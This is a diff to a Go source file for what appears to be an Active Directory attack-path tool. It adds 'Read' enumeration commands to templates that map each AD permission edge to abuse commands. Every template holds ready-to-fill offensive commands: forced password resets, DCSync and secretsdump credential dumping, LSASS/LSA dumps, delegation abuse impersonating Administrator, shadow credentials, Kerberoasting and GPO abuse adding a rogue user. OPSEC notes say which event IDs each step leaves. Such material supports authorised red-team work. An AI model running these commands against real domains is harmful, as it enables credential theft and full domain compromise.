@@ -8,6 +8,7 @@ import "github.com/krazybeastx1/omenhound/pkg/model"
 type Template struct {
 	Edge         model.EdgeKind
 	Summary      string
+	Read         string
 	Command      string
 	Alternates   []string
 	OPSEC        string
@@ -40,6 +41,7 @@ var Templates = map[model.EdgeKind]Template{
 	model.EdgeGenericAll: {
 		Edge:    model.EdgeGenericAll,
 		Summary: "Full control over the target object — equivalent to the rights the object type permits.",
+		Read:    "impacket-dacledit -action read -target-dn {TARGET_DN} '{DOMAIN}/{SOURCE_SAM}:<password>'",
 		Command: "bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p '<password>' set password {TARGET_SAM} 'NewPassw0rd!42'",
 		Alternates: []string{
 			"impacket-dacledit -action write -rights FullControl -principal {SOURCE_SAM} -target {TARGET_SAM} '{DOMAIN}/{SOURCE_SAM}:<password>'",
@@ -53,6 +55,7 @@ var Templates = map[model.EdgeKind]Template{
 	model.EdgeGenericWrite: {
 		Edge:    model.EdgeGenericWrite,
 		Summary: "Write properties of the target (e.g. scriptPath, altSecurityIdentities, RBCD) without full control.",
+		Read:    "impacket-dacledit -action read -target-dn {TARGET_DN} '{DOMAIN}/{SOURCE_SAM}:<password>'",
 		Command: "bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p '<password>' set object {TARGET_SAM} altSecurityIdentities 'X509:<I>...<S>...'",
 		Alternates: []string{
 			"# scriptPath logon-script hijack (user target)",
@@ -67,6 +70,7 @@ var Templates = map[model.EdgeKind]Template{
 	model.EdgeWriteDacl: {
 		Edge:    model.EdgeWriteDacl,
 		Summary: "Grant yourself additional rights (e.g. DCSync, GenericAll) on the target by editing its DACL.",
+		Read:    "impacket-dacledit -action read -target-dn {TARGET_DN} '{DOMAIN}/{SOURCE_SAM}:<password>'",
 		Command: "bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p '<password>' add genericAll {TARGET_DN} {SOURCE_SAM}",
 		Alternates: []string{
 			"# Grant DCSync",
@@ -80,6 +84,7 @@ var Templates = map[model.EdgeKind]Template{
 	model.EdgeWriteOwner: {
 		Edge:    model.EdgeWriteOwner,
 		Summary: "Take ownership of the target, then rewrite its DACL to gain full control.",
+		Read:    "impacket-owneredit -action read -target {TARGET_SAM} '{DOMAIN}/{SOURCE_SAM}:<password>'",
 		Command: "impacket-owneredit -action write -new-owner '{SOURCE_SAM}' -target '{TARGET_SAM}' '{DOMAIN}/{SOURCE_SAM}:<password>'",
 		Alternates: []string{
 			"bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p '<password>' set owner {TARGET_DN} {SOURCE_SAM}",
@@ -91,6 +96,7 @@ var Templates = map[model.EdgeKind]Template{
 	model.EdgeForceChangePassword: {
 		Edge:    model.EdgeForceChangePassword,
 		Summary: "Reset the target user's password without knowing the current one.",
+		Read:    "impacket-dacledit -action read -target-dn {TARGET_DN} '{DOMAIN}/{SOURCE_SAM}:<password>'",
 		Command: "bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p '<password>' set password {TARGET_SAM} 'NewPassw0rd!42'",
 		Alternates: []string{
 			"rpcclient -U '{DOMAIN}/{SOURCE_SAM}%<password>' {DC} -c \"setuserinfo2 {TARGET_SAM} 23 'NewPassw0rd!42'\"",
@@ -102,6 +108,7 @@ var Templates = map[model.EdgeKind]Template{
 	model.EdgeAddMember: {
 		Edge:    model.EdgeAddMember,
 		Summary: "Add a principal to the target group (e.g. Domain Admins).",
+		Read:    "net rpc group members '{TARGET_SAM}' -U '{DOMAIN}/{SOURCE_SAM}%<password>' -S {DC}",
 		Command: "bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p '<password>' add groupMember '{TARGET_SAM}' {SOURCE_SAM}",
 		Alternates: []string{
 			"net rpc group addmem \"{TARGET_SAM}\" \"{SOURCE_SAM}\" /add /domain",
@@ -113,6 +120,7 @@ var Templates = map[model.EdgeKind]Template{
 	model.EdgeAddSelf: {
 		Edge:    model.EdgeAddSelf,
 		Summary: "Add yourself to the target group.",
+		Read:    "net rpc group members '{TARGET_SAM}' -U '{DOMAIN}/{SOURCE_SAM}%<password>' -S {DC}",
 		Command: "bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p '<password>' add groupMember '{TARGET_SAM}' {SOURCE_SAM}",
 		Alternates: []string{
 			"Add-DomainGroupMember -Identity '{TARGET_SAM}' -Members '{SOURCE_SAM}'",
@@ -124,6 +132,7 @@ var Templates = map[model.EdgeKind]Template{
 	model.EdgeOwns: {
 		Edge:         model.EdgeOwns,
 		Summary:      "Source owns the target and may rewrite its DACL for full control.",
+		Read:         "impacket-owneredit -action read -target {TARGET_SAM} '{DOMAIN}/{SOURCE_SAM}:<password>'",
 		Command:      "impacket-dacledit -action write -rights FullControl -principal {SOURCE_SAM} -target '{TARGET_SAM}' '{DOMAIN}/{SOURCE_SAM}:<password>'",
 		OPSEC:        "DACL/owner modifications are 5136 events on the target object.",
 		EventIDs:     []int{5136},
@@ -132,6 +141,7 @@ var Templates = map[model.EdgeKind]Template{
 	model.EdgeAllowedToDelegate: {
 		Edge:    model.EdgeAllowedToDelegate,
 		Summary: "Constrained delegation: source can impersonate any user to the listed services via S4U2Self/S4U2Proxy.",
+		Read:    "impacket-findDelegation -user '{SOURCE_SAM}' -dc-ip {DC} '{DOMAIN}/{SOURCE_SAM}:<password>'",
 		Command: "impacket-getST -spn <SPN> -impersonate Administrator '{DOMAIN}/{SOURCE_SAM}:<password>'",
 		Alternates: []string{
 			"# With protocol transition (TRUSTED_TO_AUTH_FOR_DELEGATION), S4U2Self needs no user interaction.",
@@ -144,6 +154,7 @@ var Templates = map[model.EdgeKind]Template{
 	model.EdgeAllowedToAct: {
 		Edge:    model.EdgeAllowedToAct,
 		Summary: "Resource-Based Constrained Delegation: source may impersonate users to the target via S4U2Self.",
+		Read:    "impacket-rbcd -delegate-to {TARGET_SAM} -action read -dc-ip {DC} '{DOMAIN}/{SOURCE_SAM}:<password>'",
 		Command: "impacket-getST -spn cifs/{TARGET_NAME}.{DOMAIN} -impersonate Administrator -dc-ip {DC} '{DOMAIN}/{SOURCE_SAM}:<password>'",
 		Alternates: []string{
 			"Rubeus s4u /user:{SOURCE_SAM} /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/{TARGET_NAME}.{DOMAIN} /ptt",
@@ -155,6 +166,7 @@ var Templates = map[model.EdgeKind]Template{
 	model.EdgeAdminTo: {
 		Edge:    model.EdgeAdminTo,
 		Summary: "Source has local admin on the target host.",
+		Read:    "nxc smb {TARGET_NAME}.{DOMAIN} -u {SOURCE_SAM} -p '<password>'",
 		Command: "netexec smb {TARGET_NAME}.{DOMAIN} -u {SOURCE_SAM} -p '<password>' -x whoami",
 		Alternates: []string{
 			"impacket-psexec {DOMAIN}/{SOURCE_SAM}:<password>@{TARGET_NAME}.{DOMAIN}",
@@ -167,6 +179,7 @@ var Templates = map[model.EdgeKind]Template{
 	model.EdgeCanPSRemote: {
 		Edge:    model.EdgeCanPSRemote,
 		Summary: "Source may open a PowerShell Remoting (WinRM) session to the target.",
+		Read:    "nxc winrm {TARGET_NAME}.{DOMAIN} -u {SOURCE_SAM} -p '<password>'",
 		Command: "netexec winrm {TARGET_NAME}.{DOMAIN} -u {SOURCE_SAM} -p '<password>' -x whoami",
 		Alternates: []string{
 			"evil-winrm -i {TARGET_NAME}.{DOMAIN} -u {SOURCE_SAM} -p '<password>'",
@@ -178,6 +191,7 @@ var Templates = map[model.EdgeKind]Template{
 	model.EdgeExecuteDCOM: {
 		Edge:         model.EdgeExecuteDCOM,
 		Summary:      "Source can execute COM objects remotely on the target.",
+		Read:         "nxc smb {TARGET_NAME}.{DOMAIN} -u {SOURCE_SAM} -p '<password>'",
 		Command:      "impacket-dcomexec {DOMAIN}/{SOURCE_SAM}:<password>@{TARGET_NAME}.{DOMAIN} 'cmd /c whoami'",
 		OPSEC:        "DCOM execution creates a process on the target (4688 if audited) and leaves DCOM/RPC network artifacts (port 135 + dynamic RPC). Less service-level footprint than PsExec.",
 		EventIDs:     []int{4688},
@@ -186,6 +200,7 @@ var Templates = map[model.EdgeKind]Template{
 	model.EdgeHasSession: {
 		Edge:    model.EdgeHasSession,
 		Summary: "Source user has an active logon session on the target computer (their credentials are cached in memory).",
+		Read:    "nxc smb {TARGET_NAME}.{DOMAIN} -u {SOURCE_SAM} -p '<password>' --loggedon-users",
 		Command: "netexec smb {TARGET_NAME}.{DOMAIN} -u {SOURCE_SAM} -p '<password>' --lsa",
 		Alternates: []string{
 			"# Dump LSASS with a privileged context, then hunt {SOURCE_SAM}'s ticket/hash",
@@ -198,6 +213,7 @@ var Templates = map[model.EdgeKind]Template{
 	model.EdgeMemberOf: {
 		Edge:         model.EdgeMemberOf,
 		Summary:      "Source is a member of the target group; inherits its rights.",
+		Read:         "net rpc group members '{TARGET_SAM}' -U '{DOMAIN}/{SOURCE_SAM}%<password>' -S {DC}",
 		Command:      "# {SOURCE_SAM} is a member of {TARGET_SAM} — enumerate its transitive privileges, no action needed here.",
 		OPSEC:        "Structural edge. No direct event; used to chain group-derived privilege.",
 		RequiresAuth: "Structural (no action).",
@@ -205,6 +221,7 @@ var Templates = map[model.EdgeKind]Template{
 	model.EdgeDCSync: {
 		Edge:    model.EdgeDCSync,
 		Summary: "Source can replicate directory secrets (DS-Replication-Get-Changes-All) — domain-wide credential theft.",
+		Read:    "impacket-dacledit -action read -target-dn {TARGET_DN} '{DOMAIN}/{SOURCE_SAM}:<password>'",
 		Command: "impacket-secretsdump '{DOMAIN}/{SOURCE_SAM}:<password>@{DC}' -just-dc",
 		Alternates: []string{
 			"mimikatz '# ' 'lsadump::dcsync /domain:{DOMAIN} /all /csv'",
@@ -216,6 +233,7 @@ var Templates = map[model.EdgeKind]Template{
 	model.EdgeGetChanges: {
 		Edge:         model.EdgeGetChanges,
 		Summary:      "Source has DS-Replication-Get-Changes (partial replication read).",
+		Read:         "impacket-dacledit -action read -target-dn {TARGET_DN} '{DOMAIN}/{SOURCE_SAM}:<password>'",
 		Command:      "impacket-secretsdump '{DOMAIN}/{SOURCE_SAM}:<password>@{DC}' -just-dc",
 		OPSEC:        "Half of the DCSync right. 4662 events with the replication GUID.",
 		EventIDs:     []int{4662},
@@ -224,6 +242,7 @@ var Templates = map[model.EdgeKind]Template{
 	model.EdgeGetChangesAll: {
 		Edge:         model.EdgeGetChangesAll,
 		Summary:      "Source has DS-Replication-Get-Changes-All; combined with GetChanges enables DCSync.",
+		Read:         "impacket-dacledit -action read -target-dn {TARGET_DN} '{DOMAIN}/{SOURCE_SAM}:<password>'",
 		Command:      "impacket-secretsdump '{DOMAIN}/{SOURCE_SAM}:<password>@{DC}' -just-dc",
 		OPSEC:        "Half of the DCSync right. 4662 events with the replication GUID.",
 		EventIDs:     []int{4662},
@@ -232,6 +251,7 @@ var Templates = map[model.EdgeKind]Template{
 	model.EdgeReadLAPSPassword: {
 		Edge:    model.EdgeReadLAPSPassword,
 		Summary: "Source can read the target computer's local administrator password from LAPS.",
+		Read:    "nxc ldap {DC} -u {SOURCE_SAM} -p '<password>' --module laps",
 		Command: "bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p '<password>' get search --base '{TARGET_DN}' --filter '(objectClass=computer)' --attr ms-Mcs-AdmPwd,msLAPS-Password",
 		Alternates: []string{
 			"netexec ldap {DC} -u {SOURCE_SAM} -p '<password>' --laps",
@@ -243,6 +263,7 @@ var Templates = map[model.EdgeKind]Template{
 	model.EdgeReadGMSAPassword: {
 		Edge:    model.EdgeReadGMSAPassword,
 		Summary: "Source can read a Group Managed Service Account's password blob via msDS-ManagedPassword.",
+		Read:    "nxc ldap {DC} -u {SOURCE_SAM} -p '<password>' --gmsa",
 		Command: "bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p '<password>' get search --base '{TARGET_DN}' --filter '(objectClass=msDS-Group-Managed-Service-Account)' --attr msDS-ManagedPassword",
 		Alternates: []string{
 			"gMSADumper.py -u {SOURCE_SAM} -p '<password>' -d {DOMAIN}",
@@ -254,6 +275,7 @@ var Templates = map[model.EdgeKind]Template{
 	model.EdgeContains: {
 		Edge:         model.EdgeContains,
 		Summary:      "Structural containment (OU/container holds the object).",
+		Read:         "ldapsearch -H ldap://{DC} -x -D '{SOURCE_SAM}@{DOMAIN}' -w '<password>' -b '{SOURCE_DN}' -s one '(objectClass=*)' distinguishedName",
 		Command:      "# Structural edge: {TARGET_NAME} is contained by {SOURCE_DN}. No action.",
 		OPSEC:        "Structural. No event.",
 		RequiresAuth: "Structural (no action).",
@@ -261,6 +283,7 @@ var Templates = map[model.EdgeKind]Template{
 	model.EdgeGPLink: {
 		Edge:    model.EdgeGPLink,
 		Summary: "Source GPO is linked at the target container (domain/OU/site); its settings apply to everything the container holds (Enforced flag shown on the edge).",
+		Read:    "bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p '<password>' get object {TARGET_DN} --attr gPLink",
 		Command: "# GPO {SOURCE_NAME} ({SOURCE_DN}) is linked at {TARGET_DN}. To abuse: gain write on the GPO, inject an immediate scheduled task, wait for policy refresh.",
 		Alternates: []string{
 			"# SharpGPOAbuse.exe --AddComputerTask --TaskName 'evil' --Author 'NT AUTHORITY\\SYSTEM' --Command 'cmd.exe' --Arguments '/c net user hacker P@ss /add' --GPOName '{SOURCE_NAME}'",
@@ -272,6 +295,7 @@ var Templates = map[model.EdgeKind]Template{
 	model.EdgeTrustedBy: {
 		Edge:         model.EdgeTrustedBy,
 		Summary:      "Source domain is trusted by the target domain; SSID/SID-history abuse may allow cross-domain escalation.",
+		Read:         "nxc ldap {DC} -u {SOURCE_SAM} -p '<password>' --query '(objectClass=trustedDomain)' 'trustPartner trustDirection trustAttributes'",
 		Command:      "# Cross-domain trust {SOURCE_DN} -> {TARGET_DN}. Enumerate trust direction/transitivity and SID filtering.",
 		OPSEC:        "Trust changes are rare; 4706/4707 are logged if trust manipulation occurs.",
 		EventIDs:     []int{4706, 4707},
@@ -280,6 +304,7 @@ var Templates = map[model.EdgeKind]Template{
 	model.EdgeCanRDP: {
 		Edge:    model.EdgeCanRDP,
 		Summary: "Source may open a Remote Desktop session to the target host.",
+		Read:    "nxc rdp {TARGET_NAME}.{DOMAIN} -u {SOURCE_SAM} -p '<password>'",
 		Command: "xfreerdp /v:{TARGET_NAME}.{DOMAIN} /u:{SOURCE_SAM} /p:'<password>' /cert:ignore",
 		Alternates: []string{
 			"rdesktop -u {SOURCE_SAM} {TARGET_NAME}.{DOMAIN}",
@@ -291,6 +316,7 @@ var Templates = map[model.EdgeKind]Template{
 	model.EdgeAllExtendedRights: {
 		Edge:    model.EdgeAllExtendedRights,
 		Summary: "Source holds all extended rights on the target (includes ForceChangePassword, AddMember, DCSync when on a domain).",
+		Read:    "impacket-dacledit -action read -target-dn {TARGET_DN} '{DOMAIN}/{SOURCE_SAM}:<password>'",
 		Command: "bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p '<password>' set password {TARGET_SAM} 'NewPassw0rd!42'",
 		Alternates: []string{
 			"# On a Domain object, AllExtendedRights includes DS-Replication rights:",
@@ -303,6 +329,7 @@ var Templates = map[model.EdgeKind]Template{
 	model.EdgeAddKeyCredentialLink: {
 		Edge:    model.EdgeAddKeyCredentialLink,
 		Summary: "Source can write msDS-KeyCredentialLink on the target — Shadow Credentials / device credential persistence.",
+		Read:    "certipy-ad shadow list -username {SOURCE_SAM}@{DOMAIN} -password '<password>' -account {TARGET_SAM} -dc-ip {DC}",
 		Command: "certipy shadow auto -username {SOURCE_SAM}@{DOMAIN} -password '<password>' -account {TARGET_SAM}",
 		Alternates: []string{
 			"# From Windows: pywhisker / Whisker.exe add_user_fake --domain {DOMAIN} --user {TARGET_SAM} --password <KEYPAIR_PW>",
@@ -314,6 +341,7 @@ var Templates = map[model.EdgeKind]Template{
 	model.EdgeAddAllowedToAct: {
 		Edge:    model.EdgeAddAllowedToAct,
 		Summary: "Source can set the target computer's AllowedToAct list (RBCD on this computer).",
+		Read:    "impacket-rbcd -delegate-to {TARGET_SAM} -action read -dc-ip {DC} '{DOMAIN}/{SOURCE_SAM}:<password>'",
 		Command: "bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p '<password>' add rbcd {TARGET_NAME} <ATTACKER_SAM>",
 		Alternates: []string{
 			"impacket-addcomputer -computer-name 'ATTACKER$' -computer-pass 'Passw0rd' -dc-ip {DC} '{DOMAIN}/{SOURCE_SAM}:<password>'",
@@ -325,6 +353,7 @@ var Templates = map[model.EdgeKind]Template{
 	model.EdgeWriteSPN: {
 		Edge:    model.EdgeWriteSPN,
 		Summary: "Source can modify the target's servicePrincipalName — Kerberoast-on-the-fly / targeted Kerberoasting.",
+		Read:    "bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p '<password>' get object {TARGET_SAM} --attr servicePrincipalName",
 		Command: "bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p '<password>' set object {TARGET_SAM} servicePrincipalName 'http/EVIL'",
 		Alternates: []string{
 			"# Request a TGS for the planted SPN, then crack:",
@@ -337,6 +366,7 @@ var Templates = map[model.EdgeKind]Template{
 	model.EdgeWriteAccountRestrictions: {
 		Edge:    model.EdgeWriteAccountRestrictions,
 		Summary: "Source can modify the target's account restrictions (userAccountControl / msDS-AllowedToActOnBehalfOfOtherIdentity).",
+		Read:    "impacket-dacledit -action read -target-dn {TARGET_DN} '{DOMAIN}/{SOURCE_SAM}:<password>'",
 		Command: "bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p '<password>' set uac {TARGET_SAM} TRUSTED_TO_AUTH_FOR_DELEGATION",
 		Alternates: []string{
 			"# Or set RBCD delegation as with AddAllowedToAct:",
@@ -349,6 +379,7 @@ var Templates = map[model.EdgeKind]Template{
 	model.EdgeWriteGPLink: {
 		Edge:    model.EdgeWriteGPLink,
 		Summary: "Source can modify the gPLink attribute of the target container — link a hostile GPO without touching its content.",
+		Read:    "bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p '<password>' get object {TARGET_DN} --attr gPLink",
 		Command: "bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p '<password>' set object {TARGET_DN} gPLink '[LDAP://CN=<GPO>,CN=Policies,CN=System,DC={DOMAIN};0]'",
 		Alternates: []string{
 			"# OUned.py --add-link (requires GPO write too) — see 'OU having a laugh??'",
@@ -360,6 +391,7 @@ var Templates = map[model.EdgeKind]Template{
 	model.EdgeGetChangesInFilteredSet: {
 		Edge:         model.EdgeGetChangesInFilteredSet,
 		Summary:      "Source has DS-Replication-Get-Changes-In-Filtered-Set — can plant/hide SID history in a filtered domain partition.",
+		Read:         "impacket-dacledit -action read -target-dn {TARGET_DN} '{DOMAIN}/{SOURCE_SAM}:<password>'",
 		Command:      "impacket-secretsdump '{DOMAIN}/{SOURCE_SAM}:<password>@{DC}' -just-dc-user Administrator",
 		OPSEC:        "Replication-DS access is logged as 4662 with the filtered-set replication GUID.",
 		EventIDs:     []int{4662},
@@ -368,6 +400,7 @@ var Templates = map[model.EdgeKind]Template{
 	model.EdgeWriteAltSecurityIdentities: {
 		Edge:         model.EdgeWriteAltSecurityIdentities,
 		Summary:      "Source can write altSecurityIdentities on the target — bind a certificate to the account (kerberos/ms-ts issued certs).",
+		Read:         "bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p '<password>' get object {TARGET_SAM} --attr altSecurityIdentities",
 		Command:      "bloodyAD --host {DC} -d {DOMAIN} -u {SOURCE_SAM} -p '<password>' set object {TARGET_SAM} altSecurityIdentities 'X509:<I>...<S>...'",
 		OPSEC:        "altSecurityIdentities write is a 5136 event; the subsequent certificate-based logon produces 4624 + certificate hash, coinciding with domain controller 4768.",
 		EventIDs:     []int{5136, 4768},
@@ -376,6 +409,7 @@ var Templates = map[model.EdgeKind]Template{
 	model.EdgeDumpSMSAPassword: {
 		Edge:         model.EdgeDumpSMSAPassword,
 		Summary:      "Source can read the target Managed Service Account's current password blob.",
+		Read:         "nxc ldap {DC} -u {SOURCE_SAM} -p '<password>' --gmsa",
 		Command:      "gMSADumper.py -u {SOURCE_SAM} -p '<password>' -d {DOMAIN} -l {DC}",
 		OPSEC:        "msDS-ManagedPassword reads are 4662 attribute-read events against the gMSA.",
 		EventIDs:     []int{4662},
